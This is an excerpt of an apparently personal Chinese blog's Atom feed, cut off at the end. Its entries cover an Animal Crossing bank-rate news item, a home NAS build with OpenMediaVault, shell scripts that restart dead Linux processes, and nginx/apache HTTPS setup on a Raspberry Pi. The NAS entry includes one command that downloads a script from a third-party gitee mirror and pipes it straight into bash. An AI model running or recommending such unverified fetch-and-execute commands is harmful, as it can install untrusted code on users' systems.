    <category term="动森" scheme="https://mimonarchrd.gitee.io/tags/%E5%8A%A8%E6%A3%AE/"/>
    
    <category term="动物森友会" scheme="https://mimonarchrd.gitee.io/tags/%E5%8A%A8%E7%89%A9%E6%A3%AE%E5%8F%8B%E4%BC%9A/"/>
    
    <category term="大白菜攻略最详细" scheme="https://mimonarchrd.gitee.io/tags/%E5%A4%A7%E7%99%BD%E8%8F%9C%E6%94%BB%E7%95%A5%E6%9C%80%E8%AF%A6%E7%BB%86/"/>
    
  </entry>
  
  <entry>
    <title>《动森》登上《金融时报》头版 因Nook银行利率下调</title>
    <link href="https://mimonarchrd.gitee.io/2020/04/30/%E3%80%8A%E5%8A%A8%E6%A3%AE%E3%80%8B%E7%99%BB%E4%B8%8A%E3%80%8A%E9%87%91%E8%9E%8D%E6%97%B6%E6%8A%A5%E3%80%8B%E5%A4%B4%E7%89%88%20%E5%9B%A0Nook%E9%93%B6%E8%A1%8C%E5%88%A9%E7%8E%87%E4%B8%8B%E8%B0%83/"/>
    <id>https://mimonarchrd.gitee.io/2020/04/30/%E3%80%8A%E5%8A%A8%E6%A3%AE%E3%80%8B%E7%99%BB%E4%B8%8A%E3%80%8A%E9%87%91%E8%9E%8D%E6%97%B6%E6%8A%A5%E3%80%8B%E5%A4%B4%E7%89%88%20%E5%9B%A0Nook%E9%93%B6%E8%A1%8C%E5%88%A9%E7%8E%87%E4%B8%8B%E8%B0%83/</id>
    <published>2020-04-30T05:33:28.000Z</published>
    <updated>2021-09-02T00:13:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>来源：<a href="https://3g.ali213.net/news/html/506629.html">https://3g.ali213.net/news/html/506629.html</a></p><p>2020-04-30 18:54来源：互联网</p><p>　　近日，据外媒the Gamer报道，《集合啦！动物森友会》在前段时间的更新中下调了存款利率，这次的调整还让《动森》登上了《金融时报》的头版。来了解一下吧！  </p><span id="more"></span><p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_dd1506ce546c40abbd336a3ef1e1daf1.png"></p><p>　　尽管《集合啦！动物森友会》近期销量惊人，但本次它却是凭借着Nook银行的利率调整登上了《金融时报》的头版报道：在4月23日的更新当中，Nook银行调低了存款利率（从原本的0.5%削减到了不到0.05%），另外玩家获取的利息上限也被限制在了9999铃。《金融时报》因此发布了一篇名为“虚拟利息降低迫使任天堂玩家转向更高风险的资产”的报道。</p><p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_2020043052640163.jpg"></p><p>　　报道称，Nook银行的这番操作有可能是为了对抗某些“时空旅行”玩家将时间快转到月底获取大量利息收益的行为（任天堂对此并未发表官方回应）；不过此番调整也恰好与多国央行的操作类似：近期多国政府也为了应对新冠状病毒带来的影响下调了存款利率。</p><p><img src="https://img2.ali213.net/picfile/News/2020/04/30/584_e5bda46077025ab168dab54291b26c5e.png"></p><p>　　法国兴业银行战略家Albert Edwards在接受《财经时报》采访时还开玩笑地表示：“现在（Nook银行）已将利率降至接近0，他们下一个合乎逻辑的举动就是采取量化宽松措施。”他还开玩笑说，玩家们应该把游戏连上打印机，因为接下来他们可能就要开始赚钱了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;来源：&lt;a href=&quot;https://3g.ali213.net/news/html/506629.html&quot;&gt;https://3g.ali213.net/news/html/506629.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2020-04-30 18:54来源：互联网&lt;/p&gt;
&lt;p&gt;　　近日，据外媒the Gamer报道，《集合啦！动物森友会》在前段时间的更新中下调了存款利率，这次的调整还让《动森》登上了《金融时报》的头版。来了解一下吧！  &lt;/p&gt;</summary>
    
    
    
    <category term="游戏哎" scheme="https://mimonarchrd.gitee.io/categories/%E6%B8%B8%E6%88%8F%E5%93%8E/"/>
    
    
    <category term="Animal Crossing" scheme="https://mimonarchrd.gitee.io/tags/Animal-Crossing/"/>
    
    <category term="动森" scheme="https://mimonarchrd.gitee.io/tags/%E5%8A%A8%E6%A3%AE/"/>
    
    <category term="动物森友会" scheme="https://mimonarchrd.gitee.io/tags/%E5%8A%A8%E7%89%A9%E6%A3%AE%E5%8F%8B%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>搭建自己的家庭NAS</title>
    <link href="https://mimonarchrd.gitee.io/2020/02/24/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AE%B6%E5%BA%ADNAS/"/>
    <id>https://mimonarchrd.gitee.io/2020/02/24/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AE%B6%E5%BA%ADNAS/</id>
    <published>2020-02-24T04:19:52.000Z</published>
    <updated>2021-09-02T00:14:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章是不是很眼熟，哈哈。以前的NAS是用树莓派搭建的，那会儿主要是接触下NAS，看一看有什么主流NAS系统。相当于一个玩具。但是这个搭建一个像样的NAS一直在我的脑海里</p><p><strong>这篇文章最终的目标是All-in-One的NAS，所以会持续的更新。</strong>  </p><span id="more"></span><p><strong>搭建目的、用途</strong></p><p>首先，家里面有很多照片视频，都是这些年来拍的。但是都在硬盘上不方便查看，而且如果有了新的照片，还要用手机连接电脑去导入。极度的不方便，有些人说你用QQ啊，或者是别人的Cloud服务。那些不方便，而且我想自己做一点这方面的开发，并且DIY。不满足我的要求</p><p>第二，平时我的下载需求很多，有时候有多个下载的需求。需要一台下载机，支持BT，种子，磁力链，http等等协议</p><p>第三，在家电脑上有大文件，需要往别的房间的电脑等设备传输。如果用一个u盘去那样拷贝来，拷贝去真的非常的不方便。需要一个共享中心，能让我们家的所有设备连接到上面，甚至需要穿透服务</p><p>第四，平时家里的电视智能设备都是连接到WiFi下的，投屏倒是手机可以，但还是想弄一个视频库， Kodi, Emby , Jellyfin, Plex倒是能满足</p><p>第五，其实这一点才是最重要的，价格要相对便宜，性能要好。但是我最后发现还是有过剩，不过过剩的性能倒是可以允许更多的可玩性</p><p>第六，我的先头计划是直接装OMV，但是也可以用EXSi。运行多个系统。（其实还是OMV和Ubuntu）而且用了extra肯定要用docker</p><p>第七，功耗问题。我的这一套下来的预计功耗是一个月2-3块钱电费吧。实际功耗我也没有专业设备所以没有测试。我最终没有选择EXSi方案就在于功耗</p><p><strong>硬件准备</strong></p><p>这一次的NAS计划是二手优先，首先就是便宜，有性价比。但是最后只有电源是二手的，不过也是不错的1U电源。甚至发现很多可以再优化价钱的地方，但是都买回来了，放宽心态就好。</p><p>首先是CPU：树莓派的ARM处理视频解码推流等能力很孱弱。这里选定了G5400和G4900最后因为差价的70块钱还是选择了G4900。支持H.265硬解，而且是8代U。不过这里如果要用我还是建议无脑G5400</p><p>不是打广告啊</p><p>下来是主板：我选择的是华擎的H310主板，4个sata，1个pcie，支持8代U。但我这里推荐可以用B150系列的魔改主板让其支持8代U，B系列拓展性比H系列好很多。可以加装NVME硬盘等。做工也要好。而且H系列是新的主板要贵</p><p>硬盘：一块西数的蓝盘+手头有余的一块金士顿SSD装系统的（说实话是真浪费，120G装OMV最后最多就用10-15G）</p><p>内存：英睿达DDR4 2133Hz。没什么好说的，正好赶上内存涨价的时候买的</p><p>电源：台达1U电源，这种电源真贵啊</p><p>机箱部分：我是用lego组的哦</p><p>总共下来花了我1100元左右吧，这些还不包括后面软路由等其他的设备，而且硬盘现在只有一块。只能说“壕”无性价比</p><p><strong>安装OMV</strong></p><p>安装的过程就是用u盘制作一个OMV的系统，这里我放两个镜像，一个5.0.5版本一个是4.1.22版本</p><ul><li>  <strong><em>5.0.5</em></strong></li><li>  <strong><em>4.1.22</em></strong></li></ul><p>安装一步一步走就行，注意要有一个显示器，VGA和HDMI都是可以的哦。如果通过路由器的管理工具可以看见自己的NAS的IP，用ssh就可以不用显示器了</p><p>其中软件源我用的中科大的ustc的（推荐哦）</p><p>安装完成后就登录吧</p><p>这里我再放一遍NAS Web登录的默认用户名和密码和ssh登录的默认用户名密码</p><p><strong>初配置NAS</strong></p><p>简单来说就是熟悉这个OMV的panel以及配置密码、静态IP、安装omv-extra、更新软件包</p><p>我们先在“更新管理”里面更新软件包~PS.时间很长，慢慢等待….</p><p>一共90多个软件包….更新</p><p>等了3小时，真的不容易</p><p>配置静态IP，在网络里面，就不截图了</p><p>之后是安装OMV-extra安装包</p><p>我安装的是5.0.5的版本，但是找不到omv-extra插件了，这个插件是一个拓展的软件包，可以安装大型的软件包，docker啊什么的</p><p>之后就是找到<a href="http://omv-extras.org/">omv-extra官网</a></p><p>这里提供5.0.5版本的拓展包</p><ul><li>  官网</li><li>  我的私有云盘</li></ul><p>上传的时候遇到了一个问题</p><p>去系统日志一看，原来是没有设置timezone（时区）</p><p>在“日期与时间”中设置，设置完了还是有问题。日志中显示php的致命错误，显示有一个东西找不到，我是通过更新后可以上传下载好的deb的</p><p>安装完成了，这里注意下，你安装完了要用最新的extra软件包</p><p>也可以在shell中安装</p><pre><code>wget -O - https://gitee.com/Z_ero/packages/raw/master/install | bash</code></pre><p>安装好了</p><p>之后就是安装extra中的docker和portainer。docker不用说了吧，portainer是docker的可视化管理工具。很方便的就可以pull一个容器&amp;镜像、一键部署等选项真乃神器啊</p><p>都安装好了</p><p>之后直接在9000端口访问portainer</p><p>这里我省略了一些步骤，比如建立docker仓库等。这里我建立了一个local本地的仓库</p><p><strong>OMV的高级一点的玩法</strong></p><p>终于开始搭建我们的服务了</p><p>未完待续呦……</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章是不是很眼熟，哈哈。以前的NAS是用树莓派搭建的，那会儿主要是接触下NAS，看一看有什么主流NAS系统。相当于一个玩具。但是这个搭建一个像样的NAS一直在我的脑海里&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这篇文章最终的目标是All-in-One的NAS，所以会持续的更新。&lt;/strong&gt;  &lt;/p&gt;</summary>
    
    
    
    <category term="学习呦" scheme="https://mimonarchrd.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"/>
    
    
    <category term="AIO" scheme="https://mimonarchrd.gitee.io/tags/AIO/"/>
    
    <category term="NAS" scheme="https://mimonarchrd.gitee.io/tags/NAS/"/>
    
    <category term="网络附属存储" scheme="https://mimonarchrd.gitee.io/tags/%E7%BD%91%E7%BB%9C%E9%99%84%E5%B1%9E%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux上自动检测进程且重启进程的shell(转载)</title>
    <link href="https://mimonarchrd.gitee.io/2020/02/03/Linux%E4%B8%8A%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E8%BF%9B%E7%A8%8B%E4%B8%94%E9%87%8D%E5%90%AF%E8%BF%9B%E7%A8%8B%E7%9A%84shell(%E8%BD%AC%E8%BD%BD)/"/>
    <id>https://mimonarchrd.gitee.io/2020/02/03/Linux%E4%B8%8A%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E8%BF%9B%E7%A8%8B%E4%B8%94%E9%87%8D%E5%90%AF%E8%BF%9B%E7%A8%8B%E7%9A%84shell(%E8%BD%AC%E8%BD%BD)/</id>
    <published>2020-02-03T00:41:16.000Z</published>
    <updated>2021-09-03T14:57:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文链接： <a href="https://www.jb51.net/article/43961.htm">https://www.jb51.net/article/43961.htm</a></p><p>前几天服务器有一个长期运行的进程，提供服务。但是总是遇到进程被kill的情况。总是有小伙伴给我抱怨，<strong>我的思路就是用ps命令通过管道给grep之后通过字符串的处理提取出进程号，或者进程的名字。判断如果不存在就通过nohup &amp;重启这个进程。但也想看一看还有什么别的办法。</strong>所以闲来搜索下有关的shell，也想看一看别人的思路。拓宽思路  </p><p>第一种：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">program=XXXX     <span class="comment">#进程名</span></span><br><span class="line">sn=`ps -ef | grep <span class="variable">$program</span> | grep -v grep |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`  <span class="comment">#获得进程端口号</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;sn&#125;</span>&quot;</span> = <span class="string">&quot;&quot;</span> ]    <span class="comment">#如果为空,表示进程未启动</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">nohup</span> /home/oracle/XXXX  &amp;    <span class="comment">#后台启动进程</span></span><br><span class="line"><span class="built_in">echo</span> start ok !</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> running</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>这个shell就是我的思路，第三行可以通过层层管道拿到进程的pnumber。通过ps命令+参数列出进程信息，之后通过grep得到进程名匹配的那一行之后去掉grep进程的一行，因为grep命令使用的时候也是进程，如果输入进程名就会有两个匹配的结果。之后通过awk工具得到匹配行的第二个参数（也就是进程号了）</p><p>第二种：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">ps -ef |grep ./FileServer &gt; /dev/null 2&gt;&amp;1  <span class="comment">#检测进程写入/dev/null</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]  <span class="comment">#0为正常</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> logprocess run ok!</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">nohup</span> /path/to/XXXX &amp;</span><br><span class="line"><span class="built_in">echo</span> start ok !</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>这种写法涉及到标准输入输出，2是标准错误输出，1是标准输出。/dev/null是一个黑洞，这条命令也就是标准输出和错误都给这个“黑洞”，屏幕不会有任何的显示。并且如果有这个进程也就说这一条命令的执行结果为0，也就是执行成功了。</p><p>第三种：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">count=`ps -fe |grep <span class="string">&quot;a.out&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span> | <span class="built_in">wc</span> -l`</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$count</span> -lt 1 ]; <span class="keyword">then</span></span><br><span class="line">/path/to/xxxx.sh</span><br></pre></td></tr></table></figure><p>这个shell看着好简洁，基本的情况和第一种有一部分是相同的。只是后面的部分不同，是统计行数的。如果小于1就说明没有这个进程了，很好理解吧！</p><p>第四种：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;请输入进程名:&quot;</span></span><br><span class="line"><span class="built_in">read</span> process</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你要查找的进程是 <span class="variable">$process</span> ,正在查找...&quot;</span></span><br><span class="line">ps &gt; text1</span><br><span class="line">grep <span class="string">&quot;<span class="variable">$process</span>&quot;</span> text1</span><br><span class="line"><span class="built_in">declare</span> -i a=$?</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -eq 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;该进程存在&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;该进程不存在&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">rm</span> text1</span><br></pre></td></tr></table></figure><p>declare -i</p><p>是将后面的参数声明为整数型</p><p>这个sh就不解释啦，不过这个也是唯一一个要求有标准输入的shell，不是太满足我们的自动化的要求</p><p>第五种：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PNAME=<span class="string">&quot;xxxx&quot;</span></span><br><span class="line">PATHNAME=/path/to/</span><br><span class="line">LENGTH=`ps -ef|grep <span class="string">&quot;<span class="variable">$PNAME</span>&quot;</span>|grep -v grep|<span class="built_in">cut</span> -b 49-200|<span class="built_in">wc</span> -c `</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$LENGTH</span> -eq 0</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$PATHNAME</span></span><br><span class="line"><span class="built_in">nohup</span> <span class="variable">$PNAME</span> &gt;/dev/null</span><br></pre></td></tr></table></figure><p>这个是最有意思的一个shell了，它前面和第一种第三种一样的，但是到了后面cut这里就是统计前面的匹配行从位置49-200的字符之后统计大小为多少byte，如果是0就说明没有这个进程嘛，因为没有匹配的行也就不可能统计出那些字占的大小啦，这是我认为思路最有趣的一个shell了。</p><p>看了这么多的shell，有没有新的想法？快在下面交流吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原文链接： &lt;a href=&quot;https://www.jb51.net/article/43961.htm&quot;&gt;https://www.jb51.net/article/43961.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前几天服务器有一个长期运行的进程，提供服务。但是总是遇到进程被k</summary>
      
    
    
    
    <category term="学习呦" scheme="https://mimonarchrd.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"/>
    
    
    <category term="Linux" scheme="https://mimonarchrd.gitee.io/tags/Linux/"/>
    
    <category term="shell" scheme="https://mimonarchrd.gitee.io/tags/shell/"/>
    
    <category term="自动化" scheme="https://mimonarchrd.gitee.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>树莓派的新（jiu）玩法-个人博客有意思的玩法</title>
    <link href="https://mimonarchrd.gitee.io/2020/01/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%96%B0%EF%BC%88jiu%EF%BC%89%E7%8E%A9%E6%B3%95-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%8E%A9%E6%B3%95/"/>
    <id>https://mimonarchrd.gitee.io/2020/01/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%96%B0%EF%BC%88jiu%EF%BC%89%E7%8E%A9%E6%B3%95-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%8E%A9%E6%B3%95/</id>
    <published>2020-01-29T23:24:16.000Z</published>
    <updated>2021-09-05T13:31:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>上次我们看过了如何用树莓派搭建wordpress</p><p>这一次我们来玩一点不一样的，弄一点树莓派wordpress的进阶的玩法。  </p><span id="more"></span><p>1、配置https，让域名前加一个小锁子</p><p>2、配置动静分离</p><p>3、内网的博客怎么办，内网穿透就行</p><p>4、可以用CDN加速博客的访问</p><p><strong>购买一个专属自己的域名，配置https</strong></p><p>我们的网址怎么是一个IP啊</p><p>很多个人博客的域名都是通过阿里云等域名服务商进行购买的，有很多的域名可以选择，你像我都小博客就是.cn结尾的博客</p><p>因为现在的域名需要备案，所以我这里就不演示域名的购买和备案的过程了。其中ICP备案的流程应该是有2周左右，你需要提交申请书等一系列的操作</p><p>有了域名之后就可以使用HTTPS( Hyper Text Transfer Protocol over SecureSocket Layer)协议了</p><p><strong>何为HTTPs</strong></p><p>其实你可以拆开看，为HTTP + SSL/TLS 目的就是加密你的数据，让你上网访问你的博客更安全。</p><p>加密数据可以让你的数据安全起来，https采用的加密方式是非对称加密和对称加密，分别用在的整个连接的不同的阶段</p><p>https工作流程</p><p>这里面涉及到证书的问题，证书是干什么的。浏览器为了确认就是你发送的https请求，而不是别人发送的，也就是说为了防止报文数据的篡改。</p><p>通过上面的流程也就知道了我们应该申请一个数字证书，而且在服务器进行配置</p><p>如果你是通过域名服务商那里购买的域名，ICP备案完成后就可以直接去域名的仪表板里面下载域名对应的证书，我的是CA机构免费颁发的证书（下面用阿里云来举例子）</p><p>免费的证书一年</p><p>也可以上传自己的证书</p><p>证书都上传完毕了，之后就是在自己的服务器上配置了</p><p><strong>nginx配置https</strong></p><p>https和http的通信的端口是不同的，https是443，http是80</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssl</span> <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">ssl_certificate</span> /path/to/你的证书.pem;</span><br><span class="line"><span class="attribute">ssl_certificate_key</span> /path/to/你的私钥.key;</span><br><span class="line"><span class="attribute">ssl_session_timeout</span> <span class="number">5m</span>;</span><br><span class="line"><span class="attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line"><span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line"><span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br></pre></td></tr></table></figure><p>通过上图的原理图其实很好理解配置的部分，首先要开启ssl，之后就是配置公钥证书，之后配置服务器的私钥用于解密客户端用公钥加密的会话密钥，会话密钥用来加密C和S直接传输的数据</p><p>之后的配置ssl_session_timeout为会话限制时间、ssl_ciphers为整个流程中对称加密的算法，ssl_protocols为支持的传输层安全协议，之后ssl_prefer_server_ciphers是依赖SSLv3和TLSv1协议的服务器密码将优先于客户端密码</p><p><strong>apache2配置https</strong></p><p>apache2配置就更简单了，默认会有一个ssl配置的文件，只要填好证书和密钥的位置就可以了</p><p>前提是要安装好apache的php模块</p><p>如果用nginx处理全部的https请求就不用配置apache2了，否则会起端口冲突</p><p>配置好之后就是测试下吧</p><p>可以看到浏览器的地址栏如果有锁子的标识就证明连接安全哦</p><p><strong>配置动静分离</strong></p><p>还记得上次我们通过f12的开发者工具看到的资源和整个博客都是来自nginx的吗</p><p>看，又给你看一遍</p><p>我们先来了解下nginx和apache分别适合处理什么文件，什么应用场景</p><p>nginx：既可以在内部直接支持 Rails 和 PHP 程序对外进行服务，也可以支持作为 HTTP<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1">代理服务</a>对外进行服务。Nginx采用C进行编写，不论是系统资源开销还是CPU使用效率都比 Perlbal 要好很多。处理静态文件，索引文件以及自动索引，打开文件描述符缓冲。无缓存的反向代理加速，简单的负载均衡和容错。FastCGI，简单的负载均衡和容错。 （<a href="https://baike.baidu.com/item/nginx/3817705?fr=aladdin">来自度娘</a>）</p><p>apache： 超稳定， 对PHP支持比较简单， 处理动态请求有优势，nginx在这方面是鸡肋，一般动态请求要apache去做，nginx适合静态和反向。（<a href="https://blog.csdn.net/lilygg/article/details/87873964">来自CSDN</a>）</p><p>简单的了解了下之后就明白了我们为什么要动静分离了</p><p>具体思路：nginx服务器处理前端的请求，如果是请求的静态文件就可以直接处理，但是如果是动态文件就交予后端的apache2服务器。之后apache2直接通过80端口响应</p><p>我这里是实现动静分离，不是nginx的负载均衡、反向代理</p><p><strong>注意：是两台服务器，不是一台进行配置</strong>。<br><strong>以下的nginx服务器为192.168.0.115</strong><br><strong>这里wireless是115，以太网是192.168.0.118</strong><br><strong>以下的apache2服务器为192.168.0.117</strong></p><p>配置nginx</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~* \.(png|jpg|jpeg|gif|bmp|html|swf|ico|rar|zip|txt|doc|ppt|pdf|xls)$</span> &#123; <span class="attribute">expires</span> <span class="number">1d</span>;  &#125;</span><br><span class="line"><span class="section">location</span> <span class="regexp">~ \.(js.css)$</span> &#123;  <span class="attribute">expires</span> <span class="number">1h</span>; &#125;</span><br><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">                <span class="comment">#proxy_set_header Host $host;</span></span><br><span class="line">                <span class="comment">#proxy_set_header X-Real_IP $remote_addr;</span></span><br><span class="line">                <span class="comment">#proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span></span><br><span class="line">                <span class="attribute">proxy_pass</span> http://ip2yourapacheserver:8080;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>配置静态文件直接在浏览器缓存中保存的时长，这样就不需要每一次访问博客都请求这些静态的资源文件，因为这些文件是不改变的。</p><p>说明下php的配置部分</p><p><strong>remote_addr</strong><br>是nginx与客户端进行TCP连接过程中，获得的客户端真实地址. Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求</p><p><strong>X-Real-IP</strong><br>是一个自定义头。X-Real-Ip 通常被 HTTP 代理用来表示与它产生 TCP 连接的设备 IP，这个设备可能是其他代理，也可能是真正的请求端。需要注意的是，X-Real-Ip 目前并不属于任何标准，代理和 Web 应用之间可以约定用任何自定义头来传递这个信息</p><p><strong>X-Forwarded-For</strong><br>X-Forwarded-For 是一个扩展头。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP，现在已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中.</p><p>（<a href="https://www.jianshu.com/p/15f3498a7fad">作者：大富帅 链接：https://www.jianshu.com/p/15f3498a7fad</a>）</p><p>检查下语法</p><p>ok</p><p><strong>配置apache</strong></p><p>这里我用了另一台服务器，用apache2来解析处理php文件</p><p>注意，因为我的wordpress都是保存在本地的，所以，我就有了nginx服务器的MySQL和apache2服务器的MySQL，这样就有了两个数据库。但是我们只要一个就好，所以我这里想的是做MySQL的主从复制。apache2的MySQL为主服务器，nginx的为从服务器</p><p>但是建议还是用一台云MySQL，这样省事</p><p>首先配置监听端口</p><pre><code>sudo vim /path/to/ports.conf</code></pre><p>80改成8080就行，别忘了80端口，因为要通过其响应请求</p><p>因为是给后端8080端口的apache2，所以apache2要监听8080端口</p><p>之后修改virtual server文件</p><pre><code>sudo vim /path/to/apache2/sites-available/000-default.conf</code></pre><p>上面的监听端口和下面的文件目录都要改了</p><p>之后测试我遇到了一个问题</p><p>直接返回php文件了，注意这个的nginx服务器的IP和apache的IP都不是最终的</p><p>这是怎么回事呢，原来apache2安装完之后是不带php的模块了</p><p>apt检查下下载的模块</p><p><strong>我的php是7.2所以也要下载7.2的模块哦，千万别错了</strong></p><p>之后我们访问nginx服务器192.168.0.115，当然，访问apache服务器也是可以的。</p><p>访问nginx是301重定向</p><p>我们先看看动态文件</p><p>可以看到处理请求的服务器是apache2</p><p>我们再来看看静态文件</p><p>服务器是nginx文件类型是css</p><p>测试下安装一个主题，我的apache服务器是wireless，导致一直有Too many requests的错误<br>好不容易才安装好了一个主题</p><p>结果换完主题是空白一片，这个主题的css等就没加载出来，我最后还是换一个已经安装的别的主题了</p><p>可以看到没什么问题</p><p>到这里动静分离的部分就完成啦，通过ab测试下和前面单nginx对比下</p><pre><code>ab -n 1000 http://your_server_ip/path/to/your.file</code></pre><p><strong>实现动静分离后的RPS</strong></p><p>是17.30</p><p><strong>没有实现动静分离的RPS</strong></p><p>呦，有点差</p><p>通过上面的测试也可以看到动静分离，让软件干擅长的事情是多么的重要了吧</p><p><strong>内网穿透这点事</strong></p><p>内网穿透的部分</p><p>首先来说一下内网穿透，NAT穿透。NAT网络地址转换，简单大体来讲就是将一个公网的IP对应（映射）一个内网的IP</p><p>内网穿透的种类也有很多，最常用的就是端口映射NAPT。将公网IP的一个端口对应内网的一个IP</p><p>内网穿透的工具很多，花生壳，向日癸，ngrok第一代，和frp等</p><p>ngrok第一代是开源的，第二代作者商用就闭源了。frp和ngrok差不多，如果是个人的网站使用谁都可以。如果访问量大则建议frp</p><p>几款穿透工具对比</p><p>ngrok的原理简单来讲是反向代理，ngrok服务器和后端请求的服务器透明之后和客户端建立一个隧道</p><p>很明确的一张原理图</p><p>还有一个好处就是可以让后端的服务器对于客户端不可见，客户端见到的只是ngrok服务器</p><p>ngrok如果要自己搭建ngrok服务器就需要一台公网的服务器，但是大家大多数都没有（要不然要什么内网穿透建站呢，直接在公网服务器上搭建不就行了！）</p><p>这里我推荐一个<a 